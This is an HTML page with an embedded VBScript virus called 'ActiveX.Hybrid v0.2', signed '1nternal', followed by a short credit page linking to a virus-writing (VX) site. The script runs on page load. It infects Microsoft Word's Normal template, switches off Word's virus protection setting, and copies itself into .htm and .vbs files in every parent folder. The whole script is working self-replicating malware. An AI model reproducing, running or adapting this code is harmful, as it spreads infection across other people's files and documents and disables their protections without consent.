<html> <!--1nternal-->
<head>
<meta http-equiv="Content-Type"
content="text/html; charset=iso-8859-1">
<meta name="Author" content="1nternal">
</head>
<BODY>
<script language="VBScript"><!--
'On Error Resume Next
'HostType = "VBS"
'HostPath = Wscript.ScriptFullName
'Call InfWord
'Call FindHTMVBS

Private Fso, NT, HostType, InfType, HostPath, Target, NextLine, TempFile

Private Sub FindHTMVBS
	Set FSO = CreateObject("Scripting.FileSystemObject")
	cpath = fso.GetParentFolderName(HostPath)
	Set folder = fso.GetFolder(cpath)
	While folder.IsRootFolder = false 
		Set folder = fso.GetFolder(cpath)
		Set fc = folder.Files
		cpath = fso.GetParentFolderName(cpath)
		For each Target in fc
			InfType = Lcase(Fso.GetExtensionName(Target.name))
			if InfType = "html" then InfType = "htm"
			if InfType = "htm" or InfType = "vbs" AND Target.path <> HostPath then
				Set fh = fso.opentextfile(Target.path, 1, true)
				TestString = fh.readline
				fh.close
				If TestString <> "<html> <!--1nternal-->" AND TestString <> "'<html> <!--1nternal-->" then
					Call DoFile
				End IF
			End If
		Next
	Wend
End Sub

Private Sub InfWord
	Set WordObj = CreateObject("Word.Application")
	Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule
	If NT.Lines(1,1) <> "'<html> <!--1nternal-->" then
		WordObj.Options.SaveNormalPrompt = False
		NT.DeleteLines 1, NT.CountOfLines
		NT.Addfromfile HostPath
		NT.DeleteLines 171, (NT.CountOfLines - 170)
		if HostType = "HTM" then
			For j = 1 to 9
				NT.ReplaceLine j, "'" + NT.Lines(j,1)
			Next
			For j = 168 to 170
				NT.ReplaceLine j, "'" + NT.Lines(j,1)
			Next
		Else
			For j = 9 to 13
				NT.ReplaceLine j, "'" + NT.Lines(j,1)
			Next
		End if
	End If
	Set NT = Nothing
	WordObj.Quit
End Sub

Private Sub Window_Onload
	On Error Resume Next
	Randomize
	If location.protocol = "file:" AND (Int((6 * Rnd) + 1) = 1) then
		Dim FSO,folder ,fc, f1, cpath
		Set FSO = CreateObject("Scripting.FileSystemObject")
		HostPath = Replace(location.href, "file:///", "")
		HostPath = Replace(HostPath, "/", "\")
		HostType = "HTM"
		Call InfWord
		Call FindHTMVBS
		window.status = "ActiveX.Hybrid v0.2 /1nternal"
	end IF
End Sub

Private Sub Document_Close()
	On Error Resume Next
	Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
	Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
	Options.VirusProtection = False
        Options.ConfirmConversions = False
        Options.SaveNormalPrompt = False
        If NT.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                For i = 1 To 170
                        NT.InsertLines i, AD.Lines(i, 1)
                Next
        End If
        If AD.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                For i = 1 To 170
                        AD.InsertLines i, NT.Lines(i, 1)
                Next
        End If
	HostType = "DOC"
	HostPath = "C:\Windows\Web\Afile.htm"
	If (Int((15 * Rnd) + 1) = 1) then Call FindHTMVBS
End Sub

Private Sub DoFileFromFile
	Set fh = fso.opentextfile(HostPath, 1, true)
	Set ft = fso.opentextfile(Target.path, 2, true)
	For j = 1 to 170
		NextLine = fh.ReadLine
		If HostType = "HTM" then
			If InfType = "vbs" then
				If j < 9 or j > 167 then
					NextLine = "'" + NextLine
				End If
				If j > 8 And j < 14 then
					NextLine = Mid(NextLine,2)
				End If
			End If
		Else
			If InfType = "htm" then
				If j < 9 or j > 167 then
					NextLine = Mid(NextLine,2)
				End If
				If j > 8 And j < 14 then
					NextLine = "'" + NextLine
				End If
			End If
		End If		
		ft.Writeline NextLine
	Next
	fh.close
	ft.close
End Sub

Private Sub DoFileFromDoc
	Set ft = fso.opentextfile(Target.path, 2, true)
	For j = 1 to 180
		NextLine = NT.Lines (j, 1)
		If InfType = "htm" then
			If j < 9 or j > 167 then
				NextLine = Mid(NextLine,2)
			End If
		Else
			If j > 8 and j < 14 then
				NextLine = Mid(NextLine,2)
			End If
		End If
		ft.Writeline NextLine
	Next
	ft.close
End Sub

Private Sub DoFile
	TempFile = fso.GetTempName
	fso.CopyFile Target.path, TempFile
	If HostType = "DOC" then
		Call DoFileFromDoc
	Else
		Call DoFileFromFile
	End IF
	Set fh = fso.opentextfile(TempFile, 1, true)
	Set ft = fso.opentextfile(Target.path, 8, true)
	Do While fh.AtEndOfStream <> True  
		ft.WriteLine fh.ReadLine
	Loop
	ft.close
	fh.close
	fso.DeleteFile TempFile
End Sub

--></script>
</BODY>
</HTML>
<html>

<head>
<meta http-equiv="Content-Type"
content="text/html; charset=iso-8859-1">
<meta name="Author" content="1nternal">
<title>ActiveX.Comment</title>
</head>

<body>

<p align="center">&nbsp;</p>

<p align="center">&nbsp;</p>

<p align="center"><strong>ActiveX.Comment v0.1</strong></p>

<p align="center">/ 1nternal</p>

<p align="center"><a
href="http://www.geocities.com/SiliconValley/Horizon/9386">1nternal's
VX Site</a></p>

<p>&nbsp;</p>
</body>
</html>
